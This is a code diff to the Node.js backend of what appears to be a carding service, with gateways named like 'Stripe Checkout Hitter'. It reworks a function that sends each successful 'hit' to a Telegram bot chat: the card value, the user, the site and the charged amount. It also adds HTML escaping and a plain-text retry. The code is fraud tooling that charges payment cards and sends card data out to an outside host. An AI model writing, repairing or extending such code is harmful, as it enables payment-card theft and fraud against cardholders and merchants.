@@ -372,9 +372,20 @@ app.post('/verify-membership', async (req, res) => {
 
 // Hit Proxy with Limit Checks
 // Telegram Notification Helper (Server-side)
+// Helper to escape HTML special characters for Telegram
+function escapeHTML(str) {
+    if (!str) return '';
+    return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#39;');
+}
+
 async function sendHitNotification(res, gate, userPlan, userName, site, amount, card) {
     const NOTIFY_BOT_TOKEN = config.NOTIFY_BOT_TOKEN;
-    const ORIGINAL_ID = config.NOTIFY_CHAT_ID;
+    const CHAT_ID = config.NOTIFY_CHAT_ID;
 
     const gatewayMap = {
         'checkout': 'Stripe Checkout Hitter',
@@ -385,45 +396,38 @@ async function sendHitNotification(res, gate, userPlan, userName, site, amount, 
 
     const message = `
 🔥 <b>HIT DETECTED</b> ⚡
-👤 <b>User</b>: <code>${userName || 'Unknown'}</code>
-👤 <b>Plan</b>: ${userPlan.toUpperCase()}
-💳 <b>Card</b>: <code>${card || 'Unknown'}</code>
-↔️ <b>Gateway</b>: ${gateway}
+👤 <b>User</b>: <code>${escapeHTML(userName) || 'User'}</code>
+👤 <b>Plan</b>: ${escapeHTML(userPlan.toUpperCase())}
+💳 <b>Card</b>: <code>${escapeHTML(card) || 'Unknown'}</code>
+↔️ <b>Gateway</b>: ${escapeHTML(gateway)}
 ✅ <b>Response</b>: Charged Successfully
-🌐 <b>Site</b>: ${site || 'Unknown'}
-💰 <b>Amount</b>: ${amount || 'Unknown'}
+🌐 <b>Site</b>: ${escapeHTML(site) || 'Stripe Checkout'}
+💰 <b>Amount</b>: ${escapeHTML(amount) || 'Unknown'}
 `.trim();
 
-    // Try multiple ID formats for Groups vs Private Chats
-    const idVariations = [
-        ORIGINAL_ID, 
-        `-${ORIGINAL_ID}`, 
-        `-100${ORIGINAL_ID}`
-    ];
-
-    let success = false;
-    for (const chatId of idVariations) {
-        if (!chatId || success) continue;
+    try {
+        console.log(`[Notification] Sending hit to ${CHAT_ID}...`);
+        const response = await axios.post(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML',
+            disable_web_page_preview: true
+        });
+        console.log(`[Notification] SUCCESS sent to ${CHAT_ID}`);
+    } catch (err) {
+        // Fallback: If HTML fails (due to tags/characters), try sending as Plain Text
         try {
-            console.log(`[Notification] Attempting send to: ${chatId}...`);
-            const response = await axios.post(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
-                chat_id: chatId,
-                text: message,
-                parse_mode: 'HTML',
-                disable_web_page_preview: true
-            }, { timeout: 10000 });
-            
-            if (response.data.ok) {
-                console.log(`[Notification] SUCCESS sent to ${chatId}`);
-                success = true;
-            }
-        } catch (err) {
-            console.warn(`[Notification] Failed for ${chatId}: ${err.message}`);
+            console.warn(`[Notification] HTML failed, trying Plain Text...`);
+            const plainMsg = message.replace(/<[^>]*>/g, ''); // Remove HTML tags
+            await axios.post(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
+                chat_id: CHAT_ID,
+                text: `🔥 HIT DETECTED 🔥\n\n${plainMsg}`
+            });
+            console.log(`[Notification] SUCCESS sent (Plain Text) to ${CHAT_ID}`);
+        } catch (e) {
+            console.error(`[Notification] CRITICAL: Both HTML and Plain Text failed for ${CHAT_ID}`);
+            if (err.response) console.error('[Telegram Details]:', err.response.data);
         }
-    }
-
-    if (!success) {
-        console.error(`[Notification] CRITICAL: Could not send hit to ANY variation of ${ORIGINAL_ID}`);
     }
 }
 
